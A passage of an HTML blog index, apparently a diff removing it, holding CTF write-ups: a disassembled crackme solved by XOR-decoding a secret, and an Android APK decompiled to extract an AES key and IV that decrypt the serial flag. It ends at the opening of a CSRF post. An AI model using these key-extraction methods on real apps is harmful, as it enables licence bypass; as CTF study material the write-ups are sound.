-</span><span class='line'>   <span class="err">0</span><span class="nf">x00000000004005f6</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>    <span class="no">WORD</span> <span class="no">PTR</span> <span class="no">cs</span><span class="p">:</span><span class="err">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400600</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">test</span>   <span class="no">al</span><span class="p">,</span><span class="no">al</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400602</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x400622</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">+</span><span class="mi">66</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400604</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0xfffffff7</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400607</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span><span class="err">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x400</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040060f</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rdx</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400613</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rdx-0x1</span><span class="err">]</span><span class="p">,</span><span class="no">al</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400616</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rdi</span><span class="p">,</span><span class="mi">0x1</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040061a</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">movzx</span>  <span class="no">eax</span><span class="p">,</span><span class="no">BYTE</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">rdi</span><span class="err">]</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040061d</span> <span class="err">&lt;+</span><span class="mi">61</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">rsi</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400620</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jb</span>     <span class="mh">0x400600</span> <span class="p">&lt;</span><span class="no">verify_secret</span><span class="p">+</span><span class="mi">32</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400622</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x18</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400627</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x600a80</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040062c</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rcx</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040062f</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400480</span> <span class="p">&lt;</span><span class="no">memcmp@plt</span><span class="p">&gt;</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400634</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">test</span>   <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400636</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sete</span>   <span class="no">al</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400639</span> <span class="err">&lt;+</span><span class="mi">89</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x408</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400640</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">movzx</span>  <span class="no">eax</span><span class="p">,</span><span class="no">al</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400643</span> <span class="err">&lt;+</span><span class="mi">99</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>
-</span><span class='line'><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I won&rsquo;t walk through this one in detail because understanding each line
-isn&rsquo;t necessary to crack this. Let&rsquo;s skip to
-the memcmp call. If memcmp returns 0, <code>eax</code> is set to 1 and the function
-returns. This is exactly what we want. From the man page, <code>memcmp</code> takes three
-parameters, two buffers to compare and their lengths, and returns 0 if the
-buffers are identical.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='asm'><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400622</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x18</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x0000000000400627</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x600a80</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040062c</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rcx</span>
-</span><span class='line'>   <span class="err">0</span><span class="nf">x000000000040062f</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400480</span> <span class="p">&lt;</span><span class="no">memcmp@plt</span><span class="p">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here&rsquo;s the setup to the <code>memcmp</code> call. We can see the third parameter for length
-is the immediate 0x18 meaning the buffers will be 24 bytes in length. If we
-examine address 0x600a80, we find this 24 byte string:</p>
-
-<pre><code>gdb-peda$ hexd 0x600a80 /2
-0x00600a80 : 91 bf a4 85 85 c3 ba b9 9f a6 b6 b1 93 b9 83 8f   ................
-0x00600a90 : ae b1 ae c1 bc 80 ca ca 00 00 00 00 00 00 00 00   ................
-</code></pre>
-
-<p>Since this is a direct address to some memory, we can be fairly certain that
-we&rsquo;ve found some sort of secret value! Based on the <code>movzx eax,BYTE PTR [rdi]</code>
-instruction (offset 7)
-which moves a byte from the input string into eax, the <code>xor eax, 0xfffffff7</code>
-instruction (offset 36), and
-the <code>add rdi, 0x1</code> instruction (offset 54) which increments the char*
-pointer to our input string, we can reasonably guess
-that this function is xor&#8217;ing each character of our input with 0xf7 and writing
-the result into a buffer which begins at <code>rsp</code> (also pointed to by <code>rcx</code>). Since
-we now know the secret (<code>\x91\xbf\xa4\x85...</code>) and the xor key (<code>0xf7</code>) it&rsquo;s
-pretty easy to extract the password we need by xor&#8217;ing each byte of the secret
-with the xor key.</p>
-
-<p>Here&rsquo;s a way to do this with python.</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">str</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x91\xbf\xa4\x85\x85\xc3\xba\xb9\x9f\xa6\xb6\xb1\x93\xb9\x83\x8f\xae\xb1\xae\xc1\xbc\x80\xca\xca</span><span class="s">&#39;</span>
-<span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
-    <span class="n">ba</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="mh">0xf7</span>
-<span class="k">print</span> <span class="n">ba</span></code></pre></div>
-
-
-<p>Which results in this:</p>
-
-<pre><code>$ python crack.py
-fHSrr4MNhQAFdNtxYFY6Kw==
-$ ./crackme fHSrr4MNhQAFdNtxYFY6Kw==
-ok
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/09/27/suctf_re/">SU-CTF 2014 - &#8220;Commerical Application!&#8221;</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-09-27'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>This weekend I decided to try playing <a href="https://ctftime.org/event/159">SU-CTF</a>.
-I&rsquo;m pretty bad at CTF to be honest, so I was pretty thrilled to get
-one of the 200 point challenges in the third (of five) difficulty tiers.</p>
-
-<h2>&ldquo;Commerical Application!&rdquo;</h2>
-
-<p>For this challenge, we&rsquo;re given an Android application and the hint:</p>
-
-<blockquote><p>Flag is a serial number.</p></blockquote>
-
-<p>I installed it on my phone, here&rsquo;s what it looks like:</p>
-
-<p><img src="/images/apk1.png" alt="" />
-<img src="/images/apk2.png" alt="" />
-<img src="/images/apk3.png" alt="" />
-<img src="/images/apk4.png" alt="" /></p>
-
-<p>I can tap on &ldquo;Picture-01&rdquo; and sliding to the right reveals this picture, but
-if I try to tap on &ldquo;Picture-02&rdquo; or &ldquo;Pictures-03&rdquo; the app says I need to
-enter a registration key. If I tap on the gear in the top right, I&rsquo;m
-prompted to enter my product key.</p>
-
-<p>Running <code>file</code> reveals that <code>.apk</code> files are apparently just Zip archives,
-so let&rsquo;s try simply <code>unzip</code>&lsquo;ing it.</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file suCTF.apk
-suCTF.apk: Zip archive data, at least v2.0 to extract
-<span class="nv">$ </span>unzip suCTF.apk
-Archive:  suCTF.apk
-  inflating: assets/db.db
-  inflating: res/color/abs__primary_text_disable_only_holo_dark.xml
-  inflating: res/color/abs__primary_text_disable_only_holo_light.xml
-  ...
-  inflating: classes.dex
-  inflating: META-INF/MANIFEST.MF
-  inflating: META-INF/CERT.SF
-  inflating: META-INF/CERT.RSA</code></pre></div>
-
-
-<p>Cool! Now we have all the miscellaneous files that comprise the app. There&rsquo;s
-a database file, various <code>.xml</code> design files, and most interestingly, a
-<code>classes.dex</code> file. <code>.dex</code> files contain bytecode run on the Android Dalvik VM, which
-is currently the Java runtime for Android devices, so <code>classes.dex</code> likely
-contains the code that runs the app, in compiled form. We can use the nifty
-<code>d2j-dex2jar</code> utility for decompiling it into a <code>classes-dex2jar.jar</code> file. <code>.jar</code>
-files are apparently also Zip archives, and we can again <code>unzip</code> it to extract
-its contents.</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file classes.dex
-classes.dex: Dalvik dex file version 035
-<span class="nv">$ </span>d2j-dex2jar classes.dex
-dex2jar classes.dex -&gt; classes-dex2jar.jar
-<span class="nv">$ </span>unzip classes-dex2jar.jar
-  ...
-  inflating: edu/sharif/ctf/BuildConfig.class
-  inflating: edu/sharif/ctf/CTFApplication.class
-  inflating: edu/sharif/ctf/R<span class="nv">$attr</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$bool</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$color</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$dimen</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$drawable</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$id</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$integer</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$layout</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$menu</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$string</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$style</span>.class
-  inflating: edu/sharif/ctf/R<span class="nv">$styleable</span>.class
-  inflating: edu/sharif/ctf/R.class
-  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$4</span>.class
-  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$5</span>.class
-  inflating: edu/sharif/ctf/activities/MainActivity<span class="nv">$6</span>.class
-  inflating: edu/sharif/ctf/config/AppConfig.class
-  inflating: edu/sharif/ctf/db/DBHelper.class
-  inflating: edu/sharif/ctf/fragments/DListFragment<span class="nv">$1</span>.class
-  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$1</span>.class
-  inflating: edu/sharif/ctf/fragments/ListFragment<span class="nv">$OnPictureSelectedListener</span>.class
-  inflating: edu/sharif/ctf/security/KeyVerifier.class
-  ...</code></pre></div>
-
-
-<p>This produces a TON of various <code>.class</code> files, but the most interesting lie
-in the <code>edu/sharif/ctf/</code> directory and are the compiled versions of the actual
-code that makes up this app. We can use the <code>jad</code> tool to decompile these back
-into Java source and start trying to reverse the product key.</p>
-
-<p>There&rsquo;s a directory in the app source called <code>security/</code> and contains a file
-called <code>KeyVerifier.class</code> that seems pretty promising. After decompiling it,
-we find a <code>KeyVerifier</code> class with some pretty cool functions.</p>
-
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isValidLicenceKey</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
-<span class="o">{</span>
-    <span class="kt">boolean</span> <span class="n">flag</span><span class="o">;</span>
-    <span class="k">if</span><span class="o">(</span><span class="n">encrypt</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">s1</span><span class="o">,</span> <span class="n">s2</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span><span class="o">))</span>
-        <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
-    <span class="k">else</span>
-        <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
-    <span class="k">return</span> <span class="n">flag</span><span class="o">;</span>
-<span class="o">}</span>
-
-<span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
-<span class="o">{</span>
-    <span class="n">String</span> <span class="n">s3</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
-    <span class="n">String</span> <span class="n">s4</span><span class="o">;</span>
-    <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="s">&quot;AES&quot;</span><span class="o">);</span>
-    <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="o">);</span>
-    <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
-    <span class="n">s4</span> <span class="o">=</span> <span class="n">bytesToHexString</span><span class="o">(</span><span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
-    <span class="n">s3</span> <span class="o">=</span> <span class="n">s4</span><span class="o">;</span>
-<span class="nl">_L2:</span>
-    <span class="k">return</span> <span class="n">s3</span><span class="o">;</span>
-    <span class="n">Exception</span> <span class="n">exception</span><span class="o">;</span>
-    <span class="n">exception</span><span class="o">;</span>
-    <span class="n">exception</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-    <span class="k">if</span><span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="k">goto</span> <span class="n">_L2</span><span class="o">;</span> <span class="k">else</span> <span class="k">goto</span> <span class="n">_L1</span>
-<span class="nl">_L1:</span>
-<span class="o">}</span></code></pre></div>
-
-
-<p>It&rsquo;s pretty clear that <code>isValidLicenceKey()</code> is what processes the product key
-prompt in the app. The <code>encrypt()</code> function shows us that the first paramter
-<code>s</code> is the cleartext to be encrypted, the second parameter <code>s1</code> is the AES
-encryption key, and the last parameter <code>s2</code> is the AES
-<a href="http://en.wikipedia.org/wiki/Initialization_vector">initialization vector</a>.
-After doing a bit of grepping, I confirmed this by decompiling
-<code>activities/MainActivity.class</code> and finding this code snippet:</p>
-
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="n">DialogInterface</span> <span class="n">dialoginterface</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">)</span>
-<span class="o">{</span>
-    <span class="k">if</span><span class="o">(</span><span class="n">KeyVerifier</span><span class="o">.</span><span class="na">isValidLicenceKey</span><span class="o">(</span><span class="n">userInput</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityKey</span><span class="o">(),</span> <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getSecurityIv</span><span class="o">()))</span>
-    <span class="o">{</span>
-        <span class="n">app</span><span class="o">.</span><span class="na">getDataHelper</span><span class="o">().</span><span class="na">updateLicence</span><span class="o">(</span><span class="mi">2014</span><span class="o">);</span>
-        <span class="n">MainActivity</span><span class="o">.</span><span class="na">isRegisterd</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
-        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">&quot;Thank you, Your application has full licence. Enjoy it...!&quot;</span><span class="o">);</span>
-    <span class="o">}</span> <span class="k">else</span>
-    <span class="o">{</span>
-        <span class="n">showAlertDialog</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="s">&quot;Your licence key is incorrect...! Please try again with another.&quot;</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span></code></pre></div>
-
-
-<p>With
-this in mind, the code seems to AES encrypt the user input and check if it matches
-a certain output. If we had the AES key and IV, we could decrypt the given
-output and find the plaintext product key.</p>
-
-<p>Tracing through the calls for the second and third parameters passed into
-<code>isValidLicense()</code> I found that
-the AES key and IV were stored in the <code>assets/db.db</code> SQLite database I noticed
-earlier.</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sqlite3 assets/db.db
- ...
- sqlite&gt; <span class="k">select</span> * from config<span class="p">;</span>
- a           b           c           d           e                 f                                 g           h               i
- ----------  ----------  ----------  ----------  ----------------  --------------------------------  ----------  --------------  ----------
- <span class="m">1</span>           <span class="m">2</span>           <span class="m">2014</span>        <span class="m">0</span>           a5efdbd57b84ca36  37eaae0141f1a3adf8a1dee655853714  <span class="m">1000</span>        ctf.sharif.edu  9</code></pre></div>
-
-
-<p>There are no headers to the columns, but it is pretty obvious that the key
-is the longer and the IV is the shorter of the &ldquo;interesting strings&rdquo; in the
-database. For further confidence, I can verify this from the decompiled code
-in <code>db/DBHelper.class</code>.</p>
-
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">AppConfig</span> <span class="nf">getConfig</span><span class="o">()</span>
-<span class="o">{</span>
-    <span class="kt">boolean</span> <span class="n">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
-    <span class="n">AppConfig</span> <span class="n">appconfig</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">AppConfig</span><span class="o">();</span>
-    <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">myDataBase</span><span class="o">.</span><span class="na">rawQuery</span><span class="o">(</span><span class="n">SELECT_QUERY</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
-    <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">())</span>
-    <span class="o">{</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">flag</span><span class="o">));</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setInstallDate</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">2</span><span class="o">));</span>
-        <span class="k">if</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="mi">3</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span>
-            <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setValidLicence</span><span class="o">(</span><span class="n">flag</span><span class="o">);</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityIv</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">4</span><span class="o">));</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setSecurityKey</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">5</span><span class="o">));</span>
-        <span class="n">appconfig</span><span class="o">.</span><span class="na">setDesc</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">7</span><span class="o">));</span>
-    <span class="o">}</span>
-    <span class="k">return</span> <span class="n">appconfig</span><span class="o">;</span>
-<span class="o">}</span></code></pre></div>
-
-
-<p>Using the key, IV and expected encrypted output, I wrote a simple decryption
-program.</p>
-
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.spec.IvParameterSpec</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">blah</span> <span class="o">{</span>
-    <span class="c1">// omitted for brevity</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesToHexString</span><span class="o">(</span><span class="kt">byte</span> <span class="n">abyte0</span><span class="o">[])</span> <span class="o">{</span> <span class="o">...</span> <span class="o">}</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">hexStringToBytes</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span> <span class="o">...</span> <span class="o">}</span>
-
-    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">String</span> <span class="n">s1</span><span class="o">,</span> <span class="n">String</span> <span class="n">s2</span><span class="o">)</span>
-    <span class="o">{</span>
-        <span class="n">SecretKeySpec</span> <span class="n">secretkeyspec</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SecretKeySpec</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s1</span><span class="o">),</span> <span class="s">&quot;AES&quot;</span><span class="o">);</span>
-        <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="o">);</span>
-            <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">Cipher</span><span class="o">.</span><span class="na">DECRYPT_MODE</span><span class="o">,</span> <span class="n">secretkeyspec</span><span class="o">,</span> <span class="k">new</span> <span class="nf">IvParameterSpec</span><span class="o">(</span><span class="n">s2</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
-            <span class="n">key</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">hexStringToBytes</span><span class="o">(</span><span class="n">s</span><span class="o">));</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-        <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
-    <span class="o">}</span>
-
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
-        <span class="n">String</span> <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84&quot;</span><span class="o">;</span>
-        <span class="n">String</span> <span class="n">iv</span> <span class="o">=</span> <span class="s">&quot;a5efdbd57b84ca36&quot;</span><span class="o">;</span>
-        <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;37eaae0141f1a3adf8a1dee655853714&quot;</span><span class="o">;</span>
-        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">decrypt</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">iv</span><span class="o">));</span>
-    <span class="o">}</span>
-<span class="o">}</span></code></pre></div>
-
-
-
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>java blah
-fl-ag-IS-se-ri-al-NU-MB-ER</code></pre></div>
-
-
-<p>Thanks for reading!</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/09/11/csrf-news/">Abusing Admin Privileges via CSRF</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-09-11'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><em>Exploiting a classic CSRF vulnerability</em></p>
-
-<p>When I took over responsibility as the webmaster for
-<a href="http://www.ieee.neu.edu">Northeastern University&rsquo;s IEEE student chapter</a> around
-January 2014 (yes, this is a very belated post), I was suddenly reponsible for
-maintaining a custom LAMP stack Content Management System (CMS) whose core
-functionality was letting an admin post to a news feed on the front page of the
-site.
-This site has since been completely redone, but given that it is notoriously
-difficult to program securely in PHP, I decided to poke around a little and
-see if I could find any cool bugs.</p>
-
